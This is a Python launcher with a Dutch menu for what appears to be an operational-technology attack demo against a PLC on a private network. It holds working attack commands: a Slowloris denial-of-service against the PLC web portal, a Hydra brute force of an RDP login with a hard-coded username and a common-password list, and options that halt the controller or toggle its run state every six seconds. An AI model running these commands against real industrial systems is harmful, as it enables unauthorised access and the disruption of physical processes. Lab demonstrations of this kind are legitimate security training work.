import os

while True:
    print("Welkom bij het OT-Demo keuzemenu. Kies een optie:")
    print("[1]: Verander de opblaaswaardes van de PLC")
    print("[2]: Voer het 'Scanning script' uit om informatie over de PLC op te halen")
    print("[3]: Dit script draait automatisch en zet de PLC uit wanneer deze op 'RUNNING' staat *Vereist geen input*")
    print("[4]: DOS het PLC webportaal met Slowloris *Vereist geen input*")
    print("[5]: Bruteforce de PLC RDP login (WSL/LINUX vereist. HYDRA moet geinstalleerd zijn op WSL/LINUX) *Vereist geen input*")
    print("[6]: Voer een script uit dat de PLC status (Running/Stop) automatisch omzet iedere zes seconden")
    print("--------------------------------------------------")
    print("[A]: Installeer hydra op WSL (WSL installatie vereist)")
    print("[B]: Installeer de benodigdheden")
    print("--------------------------------------------------")
    print("[X]: Sluit het programma af")
    print()
    user_input = input("Aub geef uw keuze: ").lower()
    if user_input not in ["1", "2", "3", "4", "5", "6", "a", "b", "x"]:
        print("Ongeldige input, probeer het opnieuw.")
    
    elif user_input == "1":
        import scripts.PostScript
        print()
    
    elif user_input == "2":
        import scripts.AlwaysOffScript
        print()

    elif user_input == "3":
        import scripts.AutomatedAlwaysOffScript
        print()

    elif user_input == "4":
        os.system("py scripts/slowloris.py 192.168.0.1")
        print()

    elif user_input == "5":
        import os
        path = os.path.abspath(os.getcwd())
        forward_slash_path = path.replace("\\", "/")
        formatted_path = forward_slash_path.replace("C:/", "/mnt/c/")
        os.system(f'wsl hydra -t 1 -V -f -l engadm -P "{formatted_path}/scripts/commonpasswords/500-worst-passwords.txt" rdp://192.168.0.199')
        print()
    
    elif user_input == "6":
        import scripts.FlipCpuState
        print()

    elif user_input == "a":
        print("Installing hydra on WSL, please wait...")
        os.system("wsl sudo apt install hydra")
        print()

    elif user_input == "b":
        print("Installing requirements.txt, please wait...")
        os.system("pip install -r requirements.txt")
        print("Requirements installed successfully, you are ready to go.")
        print()

    elif user_input == "x":
        os.system("cls")
        break

    else:
        print("error LOL")